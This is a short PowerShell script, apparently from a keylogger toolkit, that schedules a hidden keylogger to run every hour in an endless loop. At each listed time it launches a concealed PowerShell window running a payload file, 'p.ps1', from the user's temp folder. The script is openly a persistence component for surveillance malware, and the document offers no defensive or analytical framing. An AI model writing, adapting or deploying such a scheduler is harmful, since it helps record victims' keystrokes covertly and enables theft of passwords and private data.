# powershell log scheduler
# created by : C0SM0

# times logs will be sent [keep in military time]
$logTimes = @(
    '00:00:00',
    '01:00:00',
    '02:00:00',
    '03:00:00',
    '04:00:00',
    '05:00:00',
    '06:00:00',
    '07:00:00',
    '08:00:00',
    '09:00:00',
    '10:00:00',
    '11:00:00',
    '12:00:00',
    '13:00:00',
    '14:00:00',
    '15:00:00',
    '16:00:00',
    '17:00:00',
    '18:00:00',
    '19:00:00',
    '20:00:00',
    '21:00:00',
    '22:00:00',
    '23:00:00'
)

# sort the times in chronological order
$logTimes = $logTimes | Sort-Object

# ensure keylogger runs every day
while ($true) {

    # run keylogger for each trigger time
    foreach ($t in $logTimes)
    {
        # checks if time passed already
        if((Get-Date) -lt (Get-Date -Date $t))
        {
            # sleeps until next time is reached
            while ((Get-Date -Date $t) -gt (Get-Date))
            {
              # sleeps
              (Get-Date -Date $t) - (Get-Date) | Start-Sleep
            }
  
            # runs keylogger
            powershell Start-Process powershell.exe -windowstyle hidden "$env:temp/p.ps1"
        }
    }
}